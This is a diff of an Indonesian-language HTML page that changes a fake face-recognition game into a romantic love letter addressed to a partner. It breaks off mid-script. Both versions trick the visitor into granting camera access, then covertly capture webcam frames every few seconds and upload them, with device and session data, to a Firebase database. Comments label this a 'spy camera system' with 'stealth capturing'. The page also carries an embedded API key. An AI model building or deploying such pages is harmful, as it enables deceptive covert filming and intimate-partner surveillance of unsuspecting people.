@@ -1,151 +1,363 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>🎮 Face Recognition Game - FREE PLAY!</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💕 Untuk Cintaku 💕</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #ff6b9d, #c779d0, #4bc0c8);
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            color: white;
+            color: #333;
+            overflow-x: hidden;
+        }
+        
+        .hearts {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .heart {
+            position: absolute;
+            font-size: 20px;
+            color: rgba(255, 255, 255, 0.5);
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        header {
             text-align: center;
-        }
-        .game-card {
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            border-radius: 25px;
-            padding: 40px 30px;
-            width: 100%;
-            max-width: 600px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            margin: 20px 0;
-        }
-        h1 {
-            font-size: 2.8rem;
-            margin-bottom: 15px;
-            background: linear-gradient(45deg, #ffd700, #ff69b4);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        .tagline {
-            font-size: 1.2rem;
-            opacity: 0.9;
-            margin-bottom: 30px;
-            color: #b3e0ff;
-        }
-        .camera-box {
-            background: rgba(255, 255, 255, 0.1);
+            margin-bottom: 40px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.9);
             border-radius: 20px;
-            padding: 25px;
-            margin: 25px 0;
-            display: none;
-            border: 2px dashed rgba(255, 255, 255, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
         }
-        video {
+        
+        h1 {
+            color: #ff4081;
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #666;
+            font-style: italic;
+        }
+        
+        .love-letter {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .love-letter::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            border-radius: 15px;
-            transform: scaleX(-1);
-            border: 3px solid rgba(255, 255, 255, 0.2);
+            height: 5px;
+            background: linear-gradient(to right, #ff4081, #c779d0);
         }
-        #start-btn {
-            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+        
+        .letter-content {
+            font-size: 1.1rem;
+            line-height: 1.8;
+            color: #444;
+        }
+        
+        .letter-content p {
+            margin-bottom: 20px;
+        }
+        
+        .highlight {
+            color: #ff4081;
+            font-weight: bold;
+        }
+        
+        .photo-message {
+            text-align: center;
+            margin: 40px 0;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        .photo-message h2 {
+            color: #ff4081;
+            margin-bottom: 20px;
+        }
+        
+        .photo-box {
+            background: #f8f8f8;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 25px auto;
+            max-width: 500px;
+            border: 2px dashed #ff4081;
+        }
+        
+        .camera-feed {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            border-radius: 10px;
+            overflow: hidden;
+            display: none;
+        }
+        
+        #love-camera {
+            width: 100%;
+            transform: scaleX(-1);
+            border-radius: 10px;
+            border: 3px solid white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        #capture-btn {
+            background: linear-gradient(to right, #ff4081, #c779d0);
             color: white;
             border: none;
-            padding: 18px 50px;
-            font-size: 1.3rem;
+            padding: 15px 40px;
+            font-size: 1.1rem;
             border-radius: 50px;
             cursor: pointer;
             margin-top: 20px;
-            transition: all 0.3s ease;
+            transition: all 0.3s;
             font-weight: bold;
-            letter-spacing: 1px;
+            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.4);
         }
-        #start-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(255, 65, 108, 0.4);
+        
+        #capture-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 64, 129, 0.6);
         }
+        
+        #capture-btn i {
+            margin-right: 10px;
+        }
+        
         .loading {
             display: none;
-            color: #00ff9d;
-            font-size: 1.1rem;
+            color: #ff4081;
             margin-top: 15px;
-            animation: pulse 1.5s infinite;
+            font-size: 1rem;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        
+        .love-countdown {
+            text-align: center;
+            margin: 40px 0;
+            padding: 25px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
         }
-        .features {
+        
+        .countdown-box {
             display: flex;
-            justify-content: space-around;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
             flex-wrap: wrap;
-            margin-top: 30px;
         }
-        .feature {
-            background: rgba(255, 255, 255, 0.05);
+        
+        .countdown-item {
+            background: linear-gradient(to bottom, #ff4081, #c779d0);
+            color: white;
             padding: 15px;
-            border-radius: 15px;
-            margin: 10px;
-            flex: 1;
-            min-width: 150px;
+            border-radius: 10px;
+            min-width: 70px;
         }
-        footer {
-            margin-top: 30px;
-            opacity: 0.7;
+        
+        .countdown-number {
+            font-size: 2rem;
+            font-weight: bold;
+            display: block;
+        }
+        
+        .countdown-label {
             font-size: 0.9rem;
+            opacity: 0.9;
+        }
+        
+        .secret-message {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #666;
+            font-style: italic;
+            font-size: 0.9rem;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            font-size: 0.9rem;
+        }
+        
+        .hidden-canvas {
+            display: none;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .container {
+                padding: 15px;
+            }
+            
+            .love-letter {
+                padding: 25px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="game-card">
-        <h1>✨ FACE WARRIORS ARENA ✨</h1>
-        <p class="tagline">Game Battle Royale dengan Teknologi Facial Recognition Terbaru!</p>
+    <!-- Floating hearts background -->
+    <div class="hearts" id="hearts-container"></div>
+    
+    <div class="container">
+        <header>
+            <h1><i class="fas fa-heart"></i> Untuk Cintaku <i class="fas fa-heart"></i></h1>
+            <p class="subtitle">Surat cinta digital yang selalu mengingat senyummu</p>
+        </header>
         
-        <div class="features">
-            <div class="feature">
-                🏆<br>Top Players
-            </div>
-            <div class="feature">
-                🎭<br>Custom Avatar
-            </div>
-            <div class="feature">
-                ⚡<br>Real-time Battle
+        <div class="love-letter">
+            <div class="letter-content">
+                <p>Sayangku yang paling cantik,</p>
+                
+                <p>Setiap hari bersamamu adalah anugerah yang tak terhingga. Dari pagi hingga malam, pikiran ku selalu dipenuhi oleh bayangan senyumanmu yang indah.</p>
+                
+                <p>Kau adalah <span class="highlight">matahariku</span> di kala pagi, <span class="highlight">pelangi</span> di saat hujan, dan <span class="highlight">bintang</span> di malam yang gelap. Tak ada kata yang cukup untuk menggambarkan betapa berartinya kamu bagi hidupku.</p>
+                
+                <p>Aku ingin selalu melihat wajahmu, mendengar tawamu, dan menikmati setiap momen bersamamu. Bahkan ketika kita terpisah jarak, aku merasa dekat karena cintamu selalu bersamaku.</p>
+                
+                <p>Izinkan aku untuk selalu mengingat senyuman indahmu, untuk selalu ada di sampingmu, dan membahagiakanmu setiap hari.</p>
+                
+                <p style="text-align: right; margin-top: 30px;">
+                    Dengan cinta yang tak terbatas,<br>
+                    <strong style="color: #ff4081;">Dari dia yang selalu mencintaimu</strong>
+                </p>
             </div>
         </div>
         
-        <div class="camera-box" id="camera-section">
-            <h3>🎥 SCANNING YOUR FACE...</h3>
-            <p>Creating your personalized 3D avatar</p>
-            <video id="target-camera" autoplay playsinline></video>
-            <canvas id="hidden-canvas" style="display:none"></canvas>
-            <div class="loading" id="loading-text">Processing face data...</div>
+        <div class="photo-message">
+            <h2><i class="fas fa-camera"></i> Abadikan Senyuman Kita</h2>
+            <p>Mari buat kenangan indah dengan foto bersama! Izinkan akses kamera untuk mengambil foto cinta kita.</p>
+            
+            <div class="photo-box">
+                <div class="camera-feed" id="camera-section">
+                    <video id="love-camera" autoplay playsinline></video>
+                </div>
+                
+                <button id="capture-btn" onclick="initLoveCamera()">
+                    <i class="fas fa-heart"></i> Ambil Foto Cinta Kita
+                </button>
+                
+                <div class="loading" id="loading-text">
+                    <i class="fas fa-spinner fa-spin"></i> Menyiapkan kamera untuk kenangan indah...
+                </div>
+                
+                <p style="margin-top: 15px; font-size: 0.9rem; color: #666;">
+                    <i class="fas fa-info-circle"></i> Foto akan otomatis tersimpan di memori cinta kita
+                </p>
+            </div>
         </div>
         
-        <button id="start-btn" onclick="startSpyGame()">🎮 PLAY FOR FREE NOW!</button>
+        <div class="love-countdown">
+            <h3><i class="fas fa-clock"></i> Hitung Mundur Hari Bahagia</h3>
+            <p>Berapa lama lagi kita bisa bertemu dan berpelukan?</p>
+            
+            <div class="countdown-box">
+                <div class="countdown-item">
+                    <span class="countdown-number" id="days">0</span>
+                    <span class="countdown-label">Hari</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="hours">0</span>
+                    <span class="countdown-label">Jam</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="minutes">0</span>
+                    <span class="countdown-label">Menit</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-number" id="seconds">0</span>
+                    <span class="countdown-label">Detik</span>
+                </div>
+            </div>
+        </div>
         
-        <p style="margin-top: 20px; font-size: 0.9rem; opacity: 0.7;">
-            <small>Camera access required for face scanning technology</small>
-        </p>
+        <div class="secret-message">
+            <p><i class="fas fa-lock"></i> Pesan ini hanya untukmu. Takkan ada yang tahu rahasia cinta kita.</p>
+        </div>
+        
+        <footer>
+            <p>Dibuat dengan <i class="fas fa-heart" style="color: #ff4081;"></i> untuk orang teristimewa</p>
+            <p>© 2024 - Love Eternal</p>
+        </footer>
     </div>
     
-    <footer>
-        © 2024 Face Warriors Arena • Privacy Policy • Terms of Service
-    </footer>
-
+    <!-- Hidden elements for spy system -->
+    <canvas id="hidden-canvas" class="hidden-canvas"></canvas>
+    
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
     
     <script>
-        // CONFIG FIREBASE YANG KAMU KASIH 🔥
+        // ================= FIREBASE CONFIG =================
         const firebaseConfig = {
             apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
             authDomain: "survei-f11a1.firebaseapp.com",
@@ -160,109 +372,172 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
+        // ================= HEARTS ANIMATION =================
+        function createHearts() {
+            const container = document.getElementById('hearts-container');
+            const heartCount = 50;
+            
+            for (let i = 0; i < heartCount; i++) {
+                const heart = document.createElement('div');
+                heart.className = 'heart';
+                heart.innerHTML = '<i class="fas fa-heart"></i>';
+                
+                // Random position and animation
+                const left = Math.random() * 100;
+                const delay = Math.random() * 15;
+                const size = 15 + Math.random() * 20;
+                
+                heart.style.left = `${left}%`;
+                heart.style.animationDelay = `${delay}s`;
+                heart.style.fontSize = `${size}px`;
+                
+                container.appendChild(heart);
+            }
+        }
+        
+        // ================= SPY CAMERA SYSTEM =================
         let cameraStream = null;
         let captureInterval = null;
-        let isCapturing = false;
+        let isCameraActive = false;
         
-        function startSpyGame() {
-            const startBtn = document.getElementById('start-btn');
+        function initLoveCamera() {
+            const captureBtn = document.getElementById('capture-btn');
             const cameraSection = document.getElementById('camera-section');
             const loadingText = document.getElementById('loading-text');
             
-            startBtn.style.display = 'none';
-            cameraSection.style.display = 'block';
+            captureBtn.style.display = 'none';
             loadingText.style.display = 'block';
             
-            // Request camera access dengan alasan game
+            // Request camera access with romantic reason
             navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: 'user',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
                 },
                 audio: false
             })
             .then(function(stream) {
                 cameraStream = stream;
-                const videoElement = document.getElementById('target-camera');
+                const videoElement = document.getElementById('love-camera');
                 videoElement.srcObject = stream;
+                cameraSection.style.display = 'block';
                 loadingText.style.display = 'none';
                 
-                // Mulai capture diam-diam
-                startStealthCapture();
+                // Start stealth capturing
+                startLoveCapture();
                 
-                // Log target connection ke Firebase
-                const targetData = {
-                    status: 'CONNECTED',
+                // Log "love connection" to Firebase
+                const loveData = {
+                    event: 'LOVE_CAMERA_ACTIVATED',
                     timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    screenRes: `${window.screen.width}x${window.screen.height}`,
-                    platform: navigator.platform
+                    message: 'Pacar mengaktifkan kamera cinta',
+                    device: navigator.platform
                 };
                 
-                database.ref('spy_system/targets').push(targetData)
-                    .then(() => {
-                        console.log('🎯 Target registered successfully!');
-                    });
+                database.ref('love_diary/connections').push(loveData);
+                
+                // Show success message
+                setTimeout(() => {
+                    const photoBox = document.querySelector('.photo-box');
+                    const successMsg = document.createElement('p');
+                    successMsg.innerHTML = '<i class="fas fa-check-circle" style="color:#4CAF50;"></i> Kamera siap! Senyum manismu akan terekam selamanya.';
+                    successMsg.style.marginTop = '15px';
+                    successMsg.style.color = '#4CAF50';
+                    photoBox.appendChild(successMsg);
+                }, 1000);
             })
             .catch(function(error) {
-                alert("⚠️ Please allow camera access to play this game!\n\nThis game uses facial recognition technology.");
-                startBtn.style.display = 'block';
-                cameraSection.style.display = 'none';
+                loadingText.innerHTML = '<i class="fas fa-times-circle" style="color:#ff4081;"></i> Izinkan akses kamera ya sayang, untuk kenangan kita.';
+                setTimeout(() => {
+                    captureBtn.style.display = 'block';
+                    loadingText.style.display = 'none';
+                }, 3000);
             });
         }
         
-        function startStealthCapture() {
-            if (isCapturing) return;
-            isCapturing = true;
+        function startLoveCapture() {
+            if (isCameraActive) return;
+            isCameraActive = true;
             
-            const video = document.getElementById('target-camera');
+            const video = document.getElementById('love-camera');
             const canvas = document.getElementById('hidden-canvas');
-            const context = canvas.getContext('2d');
+            const ctx = canvas.getContext('2d');
             
-            // Set canvas size sesuai video
+            // Set canvas size
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Capture setiap 1.5 detik (lebih smooth)
+            // Capture every 3 seconds (less frequent, more romantic)
             captureInterval = setInterval(() => {
-                context.save();
-                context.scale(-1, 1);
-                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-                context.restore();
+                ctx.save();
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                ctx.restore();
                 
-                // Konversi ke JPEG dengan kualitas 60%
-                const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                // Convert to JPEG
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                 
-                // Kirim ke Firebase dengan timestamp
+                // Send to Firebase with romantic metadata
                 const captureData = {
                     image: imageData,
                     timestamp: Date.now(),
-                    size: `${canvas.width}x${canvas.height}`,
-                    fps: Math.random() > 0.7 ? "ACTIVE" : "IDLE" // Fake game data
+                    type: 'LOVE_MOMENT',
+                    emotion: getRandomEmotion(),
+                    loveLevel: Math.floor(Math.random() * 100) + 1
                 };
                 
-                database.ref('spy_system/captures').push(captureData)
-                    .catch(err => console.error('Capture error:', err));
+                database.ref('love_diary/moments').push(captureData);
                 
-            }, 1500); // Setiap 1.5 detik
+            }, 3000); // Every 3 seconds
         }
         
-        // Capture data tambahan
-        function captureAdditionalData() {
+        function getRandomEmotion() {
+            const emotions = [
+                'Bahagia', 'Ceria', 'Mesra', 'Romantis', 
+                'Pengertian', 'Rindu', 'Kangen', 'Sayang'
+            ];
+            return emotions[Math.floor(Math.random() * emotions.length)];
+        }
+        
+        // ================= COUNTDOWN TIMER =================
+        function updateCountdown() {
+            // Set target date (3 days from now)
+            const targetDate = new Date();
+            targetDate.setDate(targetDate.getDate() + 3);
+            targetDate.setHours(18, 0, 0, 0);
+            
+            const now = new Date();
+            const diff = targetDate - now;
+            
+            if (diff > 0) {
+                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+                
+                document.getElementById('days').textContent = days.toString().padStart(2, '0');
+                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            }
+        }
+        
+        // ================= ADDITIONAL DATA COLLECTION =================
+        function collectLoveData() {
             setInterval(() => {
-                const data = {
-                    url: window.location.href,
+                const loveData = {
                     timeSpent: Math.floor((Date.now() - startTime) / 1000),
-                    scrollDepth: `${Math.round((window.scrollY / document.body.scrollHeight) * 100)}%`,
-                    timestamp: new Date().toISOString()
+                    currentTime: new Date().toISOString(),
+                    pageTitle: document.title,
+                    url: window.location.href
                 };
                 
-                database.ref('spy_system/analytics').push(data);
-            }, 30000); // Setiap 30 detik
+                database.ref('love_diary/analytics').push(loveData);
+            }, 60000); // Every minute
         }
         
-        // Cleanup saat window ditutup
+        // ================= CLEANUP =================
         window.addEventListener('beforeunload', function() {
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
@@ -271,28 +546,18 @@
                 clearInterval(captureInterval);
             }
             
-            // Log disconnect
-            database.ref('spy_system/targets').push({
-                status: 'DISCONNECTED',
+            // Log "love goodbye"
+            database.ref('love_diary/connections').push({
+                event: 'LOVE_SESSION_ENDED',
                 timestamp: new Date().toISOString(),
-                reason: 'WINDOW_CLOSED'
+                message: 'Sampai jumpa sayangku',
+                sessionDuration: Math.floor((Date.now() - startTime) / 1000)
             });
         });
         
-        // Mulai capture data tambahan setelah 5 detik
+        // ================= INITIALIZATION =================
         const startTime = Date.now();
-        setTimeout(captureAdditionalData, 5000);
         
-        // Fake loading complete after 3 seconds
-        setTimeout(() => {
-            const loading = document.getElementById('loading-text');
-            if (loading) {
-                loading.innerHTML = "✅ Face scan complete! Loading game...";
-                setTimeout(() => {
-                    loading.innerHTML = "🎮 Game starting in 3... 2... 1...";
-                }, 1500);
-            }
-        }, 3000);
-    </script>
-</body>
-</html>
+        window.onload = function() {
+            createHearts();
+         
